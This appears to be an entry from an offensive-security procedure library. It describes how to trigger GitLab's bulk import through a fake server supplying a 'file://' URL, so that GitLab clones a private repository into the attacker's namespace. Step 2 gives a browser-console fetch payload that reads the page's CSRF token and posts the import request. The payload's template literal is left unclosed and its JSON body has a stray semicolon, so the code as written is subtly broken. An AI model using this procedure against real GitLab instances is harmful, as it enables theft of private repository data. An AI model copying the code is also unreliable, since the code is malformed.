---
tags:
  - gitlab
  - bulk-import
  - browser-exploit
type: procedure
tools:
  - '[[tools/fake_server.py]]'
  - '[[tools/Flask]]'
  - '[[tools/Browser-Console]]'
  - '[[tools/Digest::SHA2]]'
  - '[[tools/Git]]'
tactics:
  - '[[Persistence]]'
commands: []
platforms:
  - Web
  - GitLab.com
techniques:
  - '[[Data from Information Repositories]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: f17cd4da-0c04-4a8c-959f-d375c6e476d6
created_at: '2025-12-11T03:47:59.549Z'
updated_at: '2025-12-11T03:47:59.549Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0003]]'
mitre_techniques:
  - '[[T1213]]'
---
# Initiate Bulk Import via Browser Console to Clone Repository

## Summary

This procedure triggers GitLab's bulk import via a browser console fetch request, exploiting the vulnerability to clone a target repository.

## Description

By sending a crafted POST request to /import/bulk_imports.json, the attacker initiates an import from the fake server, which supplies the 'file://' URL. This results in GitLab cloning the local repository into a new project under the attacker's namespace.

## Requirements

1. GitLab account without access to target
2. Public ngrok URL
3. Browser with developer tools

## Defense

Defensive measures and detection strategies:

- Patch URL validation to block 'file://' protocol
- Log and alert on bulk import activities

## Objectives

1. Create a new project with cloned content
2. Access private repository data
3. Demonstrate full exploit impact

## Instructions

### Step 1: Navigate to Import Pane

**Context**: Access the group import interface.

Go to https://gitlab.com/groups/new#import-group-pane and enter the ngrok URL with any token.

### Step 2: Execute Fetch Request

**Context**: Send the import payload via console.

**Command** ([[commands/browser-fetch-bulk-import]]):
```javascript
await fetch("/import/bulk_imports.json",{method:"POST",headers:{"X-CSRF-Token": document.querySelector("[name=csrf-token]").content,"Content-Type":"application/json"},body:`{"bulk_import":[{"source_type":"project_entity","source_full_path":"group1/project1","destination_namespace":"vakzz","destination_slug":"some_project_z_${Math.floor(Math.random()*10000)"}]};`});
```

> Replace namespace and slug as needed; this initiates the import.

### Step 3: Monitor and Retry

**Context**: Wait for project creation.

Wait 1-2 minutes; if empty, re-execute the fetch.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]]

### Techniques

- [[Data from Information Repositories]]

### Sub-Techniques



## Commands Used

- [[commands/browser-fetch-bulk-import]]

## Tools Used

- [[tools/Browser-Console]]

## Tags

- #gitlab
- [[commands/browser-fetch-bulk-import]]
- [[tools/Browser-Console]]
